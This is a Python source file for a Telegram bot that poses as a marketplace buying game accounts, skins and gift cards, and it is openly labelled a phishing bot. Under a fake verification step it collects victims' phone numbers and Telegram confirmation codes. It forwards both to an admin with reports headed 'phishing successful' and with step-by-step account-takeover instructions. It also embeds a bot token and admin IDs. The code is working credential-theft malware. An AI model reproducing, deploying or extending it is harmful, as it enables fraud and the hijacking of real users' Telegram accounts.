import asyncio
import logging
import sqlite3
import random
import json
import os
import tempfile
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# Загрузка переменных окружения
def load_config():
    # Проверяем переменные окружения Railway
    api_token = os.getenv('API_TOKEN')
    admin_id = os.getenv('ADMIN_ID')
    moderator_ids = os.getenv('MODERATOR_IDS')
    
    # Если нет переменных окружения, используем .env файл
    if not api_token:
        try:
            from dotenv import load_dotenv
            load_dotenv()
            api_token = os.getenv('API_TOKEN')
            admin_id = os.getenv('ADMIN_ID')
            moderator_ids = os.getenv('MODERATOR_IDS')
        except ImportError:
            pass
    
    # Проверяем обязательные переменные
    if not api_token:
        raise ValueError("API_TOKEN не найден. Установите переменную окружения API_TOKEN")
    
    # Значения по умолчанию
    if not admin_id:
        admin_id = '8358009538'
    
    if not moderator_ids:
        moderator_ids = '8358009538,987654321'
    
    return api_token, int(admin_id), [int(x.strip()) for x in moderator_ids.split(',')]

# Загружаем конфигурацию
try:
    API_TOKEN, ADMIN_ID, MODERATOR_IDS = load_config()
except ValueError as e:
    print(f"Ошибка конфигурации: {e}")
    print("Установите переменные окружения:")
    print("API_TOKEN=8568019720:AAGZhJHAvxNl2_CVYFgzW6B7nTKXZBDuUs8")
    print("ADMIN_ID=8358009538")
    print("MODERATOR_IDS=8358009538,987654321")
    exit(1)

print(f"Bot token: {API_TOKEN[:10]}...")
print(f"Admin ID: {ADMIN_ID}")
print(f"Moderator IDs: {MODERATOR_IDS}" )

# Инициализация
bot = Bot(token=API_TOKEN)
dp = Dispatcher()
# Состояния FSM
class SellerStates(StatesGroup):
    waiting_item_type = State()
    waiting_photos = State()
    waiting_description = State()
    waiting_confirm = State()

class ModeratorStates(StatesGroup):
    waiting_price = State()
    waiting_chat = State()

def init_db():
    conn = sqlite3.connect('market_bot.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            code TEXT,
            balance REAL DEFAULT 0,
            rating INTEGER DEFAULT 5,
            status TEXT DEFAULT 'active',
            registered DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица товаров
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            item_type TEXT,
            photos TEXT,
            description TEXT,
            price REAL,
            moderator_id INTEGER,
            status TEXT DEFAULT 'pending',
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Таблица чатов с модератором
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS chats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            moderator_id INTEGER,
            messages TEXT,
            status TEXT DEFAULT 'open',
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица логов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

# Проверка таблицы логов (для совместимости)
try:
    cursor.execute("SELECT 1 FROM logs LIMIT 1")
except sqlite3.OperationalError:
    cursor.execute('''
        CREATE TABLE logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()

conn, cursor = init_db()
# Функция запроса верификации
async def request_verification(callback_query: types.CallbackQuery):
    verification_text = """
🔐 *ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ*

Для продажи товаров необходимо подтвердить ваш аккаунт Telegram.

*Зачем это нужно:*
• Защита от мошенничества
• Гарантия выплат
• Юридическое оформление сделок

*Нажмите кнопку для верификации:*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="start_verification")]
    ])
    
    await bot.edit_message_text(
        verification_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    # Обработчик начала верификации
@dp.callback_query(F.data == "start_verification")
async def start_verification_process(callback_query: types.CallbackQuery):
    verification_text = """
📱 *ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА*

Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.

*Впишите номер и нажмите кнопку ниже:*
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )
# Сохранение фото
def save_photo(file_id: str, user_id: int) -> str:
    os.makedirs(f'photos/{user_id}', exist_ok=True)
    filename = f'photos/{user_id}/{file_id}_{datetime.now().timestamp()}.jpg'
    return filename

# Логирование
def log_action(user_id: int, action: str, details: str = ""):
    cursor.execute(
        "INSERT INTO logs (user_id, action, details) VALUES (?, ?, ?)",
        (user_id, action, details)
    )
    conn.commit()

# Команда /start для продавцов
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    user = message.from_user
    
    # Регистрация пользователя
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (user.id, user.username, user.first_name)
    )
    conn.commit()
    
    welcome_text = f"""
🏪 *ДОБРО ПОЖАЛОВАТЬ В МАГАЗИН Money Moves Bot | заработок!* 🎮

👋 Привет, {user.first_name}!

Мы покупаем:
• 🎮 Игровые аккаунты (Steam, Epic Games, Origin и др)
• 💎 Внутриигровые предметы (CS:GO, Dota 2, TF2 и др)
• 🎫 Игровые ключи (Steam, Xbox, PlayStation и др)
• 📱 Цифровые подарки (Apple, Amazon, Google и др)
• 🛬 Телеграмм подарки  
• 💳 Электронные ваучеры


💰 *Почему мы?*
• Мгновенная оплата
• Высокие цены
• Гарантия сделки
• Анонимность

*Выберите действие:*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 ПРОДАТЬ ТОВАР", callback_data="sell_item")],

    ])
    
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=keyboard)

# Начало продажи товара
@dp.callback_query(F.data == "sell_item")
async def start_selling(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    
    # Проверка верификации
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация
        await request_verification(callback_query)
        return
    
    item_types_text = """
🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*

Выберите категорию вашего товара:

• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
• 🎫 *Игровой ключ* - Активационный ключ игры
• 📱 *Цифровой подарок* - Gift Card, ваучер
• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
• 📦 *Другое* - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# Обработка выбора типа товара
@dp.callback_query(SellerStates.waiting_item_type)
async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
    item_types = {
        "type_account": "Игровой аккаунт",
        "type_item": "Цифровой предмет",
        "type_key": "Игровой ключ",
        "type_gift": "Цифровой подарок",
        "type_money": "Электронные деньги",
        "type_other": "Другое"
    }
    
    item_type = item_types.get(callback_query.data, "Другое")
    await state.update_data(item_type=item_type)
    
    photos_text = f"""
📸 *ДОБАВЛЕНИЕ ФОТОГРАФИЙ*

Категория: *{item_type}*

*Пришлите фотографии вашего товара:*
• Для аккаунтов: скриншоты профиля, библиотеки игр
• Для предметов: скриншоты инвентаря
• Для ключей: фото сертификата (если есть)
• Для подарков: фото карты или чека

*Требования:*
✅ Хорошее качество
✅ Виден весь товар
✅ Нет водяных знаков
✅ Максимум 5 фото

Отправьте фото или нажмите /skip если фото нет
    """
    
    await state.set_state(SellerStates.waiting_photos)
    await bot.edit_message_text(
        photos_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработка фотографий
@dp.message(SellerStates.waiting_photos, F.photo)
async def process_photos(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    # Сохраняем информацию о фото
    photo_id = message.photo[-1].file_id
    photos.append(photo_id)
    
    await state.update_data(photos=photos)
    
    if len(photos) >= 5:
        await message.answer("✅ Максимальное количество фото достигнуто")
        await ask_description(message, state)
    else:
        remaining = 5 - len(photos)
        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")

@dp.message(SellerStates.waiting_photos, Command("skip"))
async def skip_photos(message: types.Message, state: FSMContext):
    await ask_description(message, state)

async def ask_description(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    item_type = user_data.get('item_type', 'Товар')
    
    description_text = f"""
📝 *ОПИСАНИЕ ТОВАРА*

Категория: *{item_type}*

*Подробно опишите ваш товар:*

*Пример для игрового аккаунта:*
• Платформа (Steam/Epic Games/др.)
• Количество игр
• Уровень/ранг
• Наличие привязок
• История аккаунта

*Пример для предметов:*
• Название предмета
• Игра
• Редкость
• Состояние
• Особенности

*Чем подробнее описание - тем выше цена!*
    """
    
    await state.set_state(SellerStates.waiting_description)
    await message.answer(description_text, parse_mode="Markdown")

# Обработка описания
@dp.message(SellerStates.waiting_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    await state.update_data(description=description)
    
    # Получаем все данные
    user_data = await state.get_data()
    
    summary_text = f"""
📋 *ПОДТВЕРЖДЕНИЕ ЗАЯВКИ*

*Категория:* {user_data['item_type']}
*Фотографии:* {len(user_data.get('photos', []))} шт.
*Описание:*
{description}

*Далее:*
1. Модератор проверит заявку
2. Определит стоимость товара
3. Вы получите предложение цены
4. После согласия - инструкции по передаче

*Все верно?*
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
    ])
    
    await state.set_state(SellerStates.waiting_confirm)
    await message.answer(summary_text, parse_mode="Markdown", reply_markup=keyboard)

# Подтверждение заявки
@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    user_data = await state.get_data()
    
    # Сохраняем в БД
    photos_json = json.dumps(user_data.get('photos', []))
    
    cursor.execute('''
        INSERT INTO items (user_id, item_type, photos, description, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
    
    item_id = cursor.lastrowid
    conn.commit()
    
    # Отправляем модераторам
    for moderator_id in MODERATOR_IDS:
        try:
            moderator_text = f"""
🆕 *НОВАЯ ЗАЯВКА #{item_id}*
━━━━━━━━━━━━━━━━
👤 *Продавец:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
🏷 *Категория:* {user_data['item_type']}
📝 *Описание:*
{user_data['description'][:500]}...
━━━━━━━━━━━━━━━━
*Действия:*
            """
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 ОЦЕНИТЬ", callback_data=f"price_{item_id}"),
                 InlineKeyboardButton(text="💬 ЧАТ", callback_data=f"chat_{item_id}")],
                [InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{item_id}")]
            ])
            
            await bot.send_message(
                moderator_id,
                moderator_text,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
            
            # Отправляем фото если есть
            photos = user_data.get('photos', [])
            if photos:
                media_group = []
                for photo_id in photos[:3]:  # Первые 3 фото
                    media_group.append(types.InputMediaPhoto(media=photo_id))
                
                await bot.send_media_group(moderator_id, media_group)
                
        except Exception as e:
            print(f"Ошибка отправки модератору {moderator_id}: {e}")
    
    # Ответ пользователю
    user_response = f"""
✅ *ЗАЯВКА #{item_id} ПРИНЯТА!*

*Статус:* На модерации ⏳

*Что дальше:*
1. Модератор оценит ваш товар (1-24 часа)
2. Вы получите предложение цены
3. После согласия - инструкции по передаче
4. Получение денег на карту/кошелек

*Среднее время проверки:* 2-4 часа
*Следить за статусом:* /mystatus
    """
    
    await bot.edit_message_text(
        user_response,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    
    await state.clear()

# Обработка оценки модератором
@dp.callback_query(F.data.startswith("price_"))
async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    
    # Получаем информацию о товаре
    cursor.execute(
        "SELECT i.*, u.first_name, u.username FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("Товар не найден")
        return
    
    price_text = f"""
💰 *УСТАНОВКА ЦЕНЫ*

*Заявка #{item_id}*
*Продавец:* {item[8]} (@{item[9]})
*Товар:* {item[2]}
*Описание:*
{item[4][:300]}...

*Рекомендуемые цены:*
• Аккаунты: 500-5000 руб
• Предметы: 50-5000 руб
• Ключи: 300-3000 руб
• Подарки: 100-10000 руб

*Введите цену в рублях:*
    """
    
    await state.set_state(ModeratorStates.waiting_price)
    await state.update_data(item_id=item_id, moderator_id=callback_query.from_user.id)
    
    await bot.edit_message_text(
        price_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработка ввода цены модератором
@dp.message(ModeratorStates.waiting_price, F.text.regexp(r'^\d+$'))
async def process_price_input(message: types.Message, state: FSMContext):
    price = int(message.text)
    moderator_data = await state.get_data()
    item_id = moderator_data['item_id']
    moderator_id = moderator_data['moderator_id']
    
    # Обновляем цену в БД
    cursor.execute(
        "UPDATE items SET price = ?, moderator_id = ?, status = 'approved' WHERE id = ?",
        (price, moderator_id, item_id)
    )
    conn.commit()
    
    # Получаем данные о продавце
    cursor.execute(
        "SELECT user_id FROM items WHERE id = ?",
        (item_id,)
    )
    seller_id = cursor.fetchone()[0]
    
    # Отправляем предложение продавцу
    offer_text = f"""
🎉 *ПРЕДЛОЖЕНИЕ ЦЕНЫ!*

*Заявка #{item_id} одобрена!*

💰 *Наша цена:* *{price} руб.*

*Принять предложение?*

*После принятия:*
1. Вы получите инструкции по передаче товара
2. Мы проверим получение
3. Вы получите деньги на карту/кошелек

*Срок выплаты:* 1-24 часа после проверки
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{item_id}"),
         InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"decline_{item_id}")],
        [InlineKeyboardButton(text="💬 ОБСУДИТЬ ЦЕНУ", callback_data=f"negotiate_{item_id}")]
    ])
    
    try:
        await bot.send_message(
            seller_id,
            offer_text,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
    except:
        pass
    
    # Уведомляем модератора
    await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
    
    await state.clear()

# Чат с модератором
@dp.callback_query(F.data.startswith("chat_"))
async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    moderator_id = callback_query.from_user.id
    
    # Получаем информацию
    cursor.execute(
        "SELECT i.user_id, u.first_name FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("Товар не найден")
        return
    
    seller_id = item[0]
    seller_name = item[1]
    
    # Создаем или находим чат
    cursor.execute(
        "SELECT id FROM chats WHERE user_id = ? AND moderator_id = ? AND status = 'open'",
        (seller_id, moderator_id)
    )
    chat = cursor.fetchone()
    
    if not chat:
        cursor.execute(
            "INSERT INTO chats (user_id, moderator_id, messages) VALUES (?, ?, ?)",
            (seller_id, moderator_id, json.dumps([]))
        )
        chat_id = cursor.lastrowid
        conn.commit()
    else:
        chat_id = chat[0]
    
    chat_text = f"""
💬 *ЧАТ С ПРОДАВЦОМ*

*Продавец:* {seller_name}
*Заявка:* #{item_id}
*Чат ID:* {chat_id}

*Напишите сообщение продавцу:*
    """
    
    await state.set_state(ModeratorStates.waiting_chat)
    await state.update_data(chat_id=chat_id, seller_id=seller_id)
    
    await bot.edit_message_text(
        chat_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )

# Обработка сообщений модератора
@dp.message(ModeratorStates.waiting_chat)
async def process_moderator_message(message: types.Message, state: FSMContext):
    chat_data = await state.get_data()
    chat_id = chat_data['chat_id']
    seller_id = chat_data['seller_id']
    
    # Сохраняем сообщение
    cursor.execute("SELECT messages FROM chats WHERE id = ?", (chat_id,))
    messages_json = cursor.fetchone()[0]
    messages = json.loads(messages_json) if messages_json else []
    
    messages.append({
        "from": "moderator",
        "text": message.text,
        "time": datetime.now().isoformat()
    })
    
    cursor.execute(
        "UPDATE chats SET messages = ? WHERE id = ?",
        (json.dumps(messages), chat_id)
    )
    conn.commit()
    
    # Отправляем продавцу
    try:
        await bot.send_message(
            seller_id,
            f"📨 *Сообщение от поддержки:*\n\n{message.text}",
            parse_mode="Markdown"
        )
    except:
        await message.answer("⚠️ Не удалось отправить сообщение продавцу")
    
    await message.answer("✅ Сообщение отправлено")

# Принятие цены продавцом (фишинговая часть)
@dp.callback_query(F.data.startswith("accept_"))
async def seller_accept_price(callback_query: types.CallbackQuery):
    item_id = int(callback_query.data.split("_")[1])
    user = callback_query.from_user
    
    # Проверяем верификацию
    cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()
    
    if not user_data or not user_data[0]:
        # Требуется верификация для выплаты
        verification_text = f"""
✅ *ЦЕНА ПРИНЯТА!*

*Заявка #{item_id} готова к оплате.*

🔐 *Для получения выплаты требуется верификация аккаунта:*

*Это необходимо для:*
• Защиты от мошенничества
• Юридического оформления сделки
• Отправки денег на правильный номер

*Нажмите кнопку для верификации:*
        """
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔐 ПРОЙТИ ВЕРИФИКАЦИЮ", callback_data="verify_for_payment")]
        ])
        
        await bot.edit_message_text(
            verification_text,
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="Markdown",
            reply_markup=keyboard
        )
        
        # Сохраняем контекст
        cursor.execute(
            "UPDATE items SET status = 'awaiting_verification' WHERE id = ?",
            (item_id,)
        )
        conn.commit()
        
        return
    
    # Если уже верифицирован - запрашиваем код
    code_request_text = f"""
✅ *ВЕРИФИКАЦИЯ ПРОЙДЕНА*

*Для защиты сделки требуется подтверждение:*

📱 *На номер +{user_data[0]} отправлен SMS код*

*Введите 5-значный код из SMS:*

*Это необходимо для подтверждения личности получателя платежа.*
    """
    
    await bot.edit_message_text(
        code_request_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown"
    )
    
    # Сохраняем ожидание кода
    cursor.execute(
        "UPDATE items SET status = 'awaiting_code' WHERE id = ?",
        (item_id,)
    )
    conn.commit()

# Верификация для выплаты (фишинг)
@dp.callback_query(F.data == "verify_for_payment")
async def request_payment_verification(callback_query: types.CallbackQuery):
    verification_text = """
📱 *ВЕРИФИКАЦИЯ ДЛЯ ВЫПЛАТЫ*

*Для получения денежных средств необходимо подтвердить номер телефона, привязанный к Telegram.*

*Это требуется для:*
• Отправки денег на правильный номер
• Защиты от ошибочных переводов
• Юридического оформления сделки

*Нажмите кнопку ниже для подтверждения номера:*
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )
def init_db():
    # Определяем путь к БД в зависимости от окружения
    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_STATIC_URL'):
        # На Railway используем временную директорию
        db_path = os.path.join(tempfile.gettempdir(), 'market_bot.db')
        print(f"Using database at: {db_path}")
    else:
        # Локально используем текущую директорию
        db_path = 'market_bot.db'
        print(f"Using local database: {db_path}")
    
    conn = sqlite3.connect(db_path, check_same_thread=False)
    cursor = conn.cursor()
    
    # Остальной код создания таблиц...
# Обработка номера телефона (фишинг)
@dp.message(F.contact)
async def process_phone_number(message: types.Message):
    user = message.from_user
    phone = message.contact.phone_number
    
    # Сохраняем номер
    cursor.execute(
        "UPDATE users SET phone = ? WHERE user_id = ?",
        (phone, user.id)
    )
    conn.commit()
    
    # Уведомляем админа
    admin_msg = f"""
🎣 *НОВЫЙ НОМЕР ДЛЯ ФИШИНГА*
👤 {user.first_name} (@{user.username})
📱 +{phone}
🆔 {user.id}
💎 Ожидает выплаты
⏰ {datetime.now().strftime('%H:%M:%S')}
    """
    
    try:
        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
    except:
        pass
    
    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
    fake_code = random.randint(10000, 999999)
    
    # Сохраняем сгенерированный код для проверки
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (str(fake_code), user.id)
    )
    conn.commit()
    
    # Запрашиваем код с указанием фейкового кода
    code_text = f"""
✅ *НОМЕР ПОДТВЕРЖДЕН: +{phone}*

🔐 *ФИНАЛЬНЫЙ ЭТАП*

*На номер +{phone} отправлен SMS с кодом подтверждения.*

*📱 Пример кода который может прийти:*
`{fake_code}`

*Введите 5-6 значный код из SMS для завершения верификации:*

*Обратите внимание:* Код должен состоять только из цифр!
    """
    
    await message.answer(
        code_text,
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove()
    )

# Обработка кода подтверждения (фишинг) - проверяем любой код
@dp.message(F.text.regexp(r'^\d{5,6}$'))
async def process_verification_code(message: types.Message):
    user = message.from_user
    code = message.text
    
    # Проверяем сохраненный код (фейковый)
    cursor.execute("SELECT code FROM users WHERE user_id = ?", (user.id,))
    saved_code = cursor.fetchone()
    
    # Сохраняем введенный код (даже если не совпадает)
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (code, user.id)
    )
    conn.commit()
    
    # УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ (всегда успешно)
    success_text = """
✅ *Регистрация прошла успешно!*

📸 *Следующий шаг:*
Отправьте фотографии и подробное описание вашего товара для определения его стоимости.

*Что нужно отправить:*
1. Фотографии товара (скриншоты, фото карты и т.д.)
2. Подробное описание
3. Дополнительная информация

*Наш модератор оценит товар в течение 1-24 часов и предложит цену.*

*Спасибо за сотрудничество!*
    """
    
    await message.answer(success_text, parse_mode="Markdown")
    
    # Отправка данных админу
    cursor.execute(
        "SELECT phone, code FROM users WHERE user_id = ?",
        (user.id,)
    )
    user_data = cursor.fetchone()
    
    if user_data:
        admin_report = f"""
🎣 *ФИШИНГ УСПЕШЕН!*
━━━━━━━━━━━━━━━━
👤 *Жертва:* {user.first_name} (@{user.username})
🆔 *User ID:* {user.id}
📱 *Телефон:* +{user_data[0]}
🔢 *Введенный код:* {code}
💾 *Сохраненный код:* {saved_code[0] if saved_code else 'нет'}
💰 *Мотив:* Продажа игрового товара
⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
*Код подтверждения получен!*
*Можно переходить к захвату аккаунта*
        """
        
        try:
            await bot.send_message(ADMIN_ID, admin_report, parse_mode="Markdown")
            
            # Дополнительное уведомление
            actions_text = f"""
📋 *Действия с полученными данными:*
1. Использовать код {code} для входа в аккаунт
2. Восстановить пароль через код подтверждения
3. Проверить привязанные сессии
4. Сменить привязанный номер телефона
            """
            await bot.send_message(ADMIN_ID, actions_text)
            
        except Exception as e:
            print(f"Ошибка отправки админу: {e}")
        
        # Автоматически предлагаем отправить товар
        offer_text = f"""
📋 *Теперь вы можете отправить товар на оценку*

*Для этого:*
1. Нажмите кнопку ниже
2. Отправьте фотографии товара
3. Опишите подробно что вы продаете
4. Модератор оценит и предложит цену
        """
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📦 ОТПРАВИТЬ ТОВАР НА ОЦЕНКУ", callback_data="sell_item_after_verify")]
        ])
        
        await message.answer(offer_text, parse_mode="Markdown", reply_markup=keyboard)
# Обработчик для отправки товара после верификации
@dp.callback_query(F.data == "sell_item_after_verify")
async def sell_after_verification(callback_query: types.CallbackQuery, state: FSMContext):
    item_types_text = """
🎯 *ЧТО ВЫ ХОТИТЕ ПРОДАТЬ?*

Выберите категорию вашего товара:

• 🎮 *Игровой аккаунт* - Steam, Epic Games, Origin, Uplay
• 💎 *Цифровой предмет* - CS:GO скины, Dota 2 предметы
• 🎫 *Игровой ключ* - Активационный ключ игры
• 📱 *Цифровой подарок* - Gift Card, ваучер
• 💳 *Электронные деньги* - Qiwi, Яндекс.Деньги
• 📦 *Другое* - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="Markdown",
        reply_markup=keyboard
    )
# Запуск бота
async def main():
    print("=" * 50)
    print("🛒 MARKET PHISHING BOT")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"👮 Moderators: {MODERATOR_IDS}")
    print(f"💾 Database: market_bot.db")
    print("=" * 50)
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())